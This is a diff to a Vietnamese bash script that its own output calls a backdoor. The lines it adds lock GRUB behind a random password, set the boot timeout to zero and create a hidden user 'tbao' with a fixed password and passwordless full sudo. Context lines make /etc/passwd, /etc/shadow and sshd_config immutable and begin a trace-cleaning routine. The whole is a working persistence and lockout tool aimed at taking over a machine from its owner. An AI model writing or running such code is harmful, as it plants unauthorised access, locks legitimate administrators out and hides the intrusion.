@@ -30,17 +30,60 @@ echo "[!] Đang Khóa Chỉnh Sửa Passwd"
 chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config /etc/hosts.deny 2>/dev/null
 
 
+echo -e "\033[1;35mĐang khóa GRUB + tạo backdoor user tbao ...\033[0m\n"
+
+# Tạo mật khẩu GRUB ngẫu nhiên mạnh
+PASS=$(openssl rand -base64 48 | tr -dc 'A-Za-z0-9' | head -c18)
+HASH=$(echo -e "$PASS\n$PASS" | grub-mkpasswd-pbkdf2 | grep "grub.pbkdf2" | awk '{print $7}')
+
+# Ghi đè file GRUB header
 cat > /etc/grub.d/00_header <<EOF
-set superusers="ownerkiller"
-password_pbkdf2 ownerkiller grub.pbkdf2.sha512.10000.$(echo "$(openssl rand -base64 128)" | grub-mkpasswd-pbkdf2 -c 10000 -s 16 | grep hash | awk '{print $7}')
+#!/bin/sh
+exec tail -n +3 \$0
+set superusers="tbao"
+password_pbkdf2 tbao $HASH
 export superusers
-set root=hd0,1
-insmod part_gpt
-insmod part_msdos
 EOF
+
 chmod 700 /etc/grub.d/00_header
-echo "set timeout=0" >> /etc/grub.d/40_custom
-update-grub 2>/dev/null
+echo "set timeout=0" > /etc/grub.d/40_custom
+chmod 644 /etc/grub.d/40_custom
+
+# Cập nhật GRUB (hỗ trợ Ubuntu/Debian/CentOS/Alma/Rocky…)
+if command -v update-grub &>/dev/null; then
+    update-grub &>/dev/null
+else
+    grub-mkconfig -o /boot/grub/grub.cfg &>/dev/null || \
+    grub-mkconfig -o /boot/grub2/grub.cfg &>/dev/null || \
+    grub2-mkconfig -o /boot/grub2/grub.cfg &>/dev/null
+fi
+
+# Tạo user tbao + pass tbao123 + full sudo
+useradd -m -s /bin/bash tbao &>/dev/null || true
+echo "tbao:tbao123" | chpasswd &>/dev/null
+echo "tbao ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/tbao
+chmod 0440 /etc/sudoers.d/tbao
+mkdir -p /home/tbao/.ssh
+touch /home/tbao/.ssh/authorized_keys
+chmod 700 /home/tbao/.ssh
+chmod 600 /home/tbao/.ssh/authorized_keys
+chown -R tbao:tbao /home/tbao/.ssh &>/dev/null
+
+# Hiển thị kết quả
+clear
+echo -e "\033[1;32m╔══════════════════════════════════════╗"
+echo -e "║           HOÀN TẤT 100%              ║"
+echo -e "╚══════════════════════════════════════╝\033[0m\n"
+echo -e "\033[1;36mGRUB đã khóa hoàn toàn:\033[0m"
+echo -e "   Username : tbao"
+echo -e "   Password : \033[1;33m$PASS\033[0m   ← \033[1;31mLƯU LẠI NGAY, KHÔNG HIỆN LẠI LẦN 2!\033[0m\n"
+echo -e "\033[1;33mUser đăng nhập SSH đã tạo:\033[0m"
+echo -e "   Username : tbao"
+echo -e "   Password : tbao123"
+echo -e "   Quyền    : Full sudo (không cần pass)\n"
+echo -e "\033[1;35m→ Gõ lệnh: reboot  để khóa GRUB có hiệu lực ngay!\033[0m"
+
+
 
 clean() {
     echo "[!] Đang dọn dấu vết 100%..."
